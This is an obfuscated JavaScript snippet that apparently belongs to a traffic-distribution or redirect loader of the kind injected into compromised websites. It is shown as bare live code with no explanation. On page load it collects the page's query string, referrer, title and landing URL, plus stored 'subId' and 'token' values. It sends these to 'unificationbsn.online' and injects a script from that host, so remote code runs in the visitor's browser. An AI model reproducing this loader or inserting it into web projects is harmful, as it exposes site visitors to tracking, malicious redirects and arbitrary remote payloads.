(function() {
    var name = '_hxVxbSGGsvyw2Fq5';
    if (!window._hxVxbSGGsvyw2Fq5) {
        window._hxVxbSGGsvyw2Fq5 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://unificationbsn.online/marisk',
            P_PATH: 'https://unificationbsn.online/ad89deb/postback',
        };
    }
    const _HNwtK9Tj4XZ2xvPv = localStorage.getItem('config');
    if (typeof _HNwtK9Tj4XZ2xvPv !== 'undefined' && _HNwtK9Tj4XZ2xvPv !== null) {
        var _XRDqMhZPHqJ1qGj1 = JSON.parse(_HNwtK9Tj4XZ2xvPv);
        var _yTRLvQZrGTyPHwJL = Math.round(+new Date()/1000);
        if (_XRDqMhZPHqJ1qGj1.created_at + window._hxVxbSGGsvyw2Fq5.ttl < _yTRLvQZrGTyPHwJL) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _WJgK3ZVRP4W7g5gb = localStorage.getItem('subId');
    var _XRGtpv7CNBthkgTB = localStorage.getItem('token');
    var _5sDH6Pm1pzWxS3Wq = '?return=js.client';
        _5sDH6Pm1pzWxS3Wq += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _5sDH6Pm1pzWxS3Wq += '&se_referrer=' + encodeURIComponent(document.referrer);
        _5sDH6Pm1pzWxS3Wq += '&default_keyword=' + encodeURIComponent(document.title);
        _5sDH6Pm1pzWxS3Wq += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _5sDH6Pm1pzWxS3Wq += '&name=' + encodeURIComponent(name);
        _5sDH6Pm1pzWxS3Wq += '&host=' + encodeURIComponent(window._hxVxbSGGsvyw2Fq5.R_PATH);
    if (typeof _WJgK3ZVRP4W7g5gb !== 'undefined' && _WJgK3ZVRP4W7g5gb && window._hxVxbSGGsvyw2Fq5.unique) {
        _5sDH6Pm1pzWxS3Wq += '&sub_id=' + encodeURIComponent(_WJgK3ZVRP4W7g5gb);
    }
    if (typeof _XRGtpv7CNBthkgTB !== 'undefined' && _XRGtpv7CNBthkgTB && window._hxVxbSGGsvyw2Fq5.unique) {
        _5sDH6Pm1pzWxS3Wq += '&token=' + encodeURIComponent(_XRGtpv7CNBthkgTB);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._hxVxbSGGsvyw2Fq5.R_PATH + _5sDH6Pm1pzWxS3Wq;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
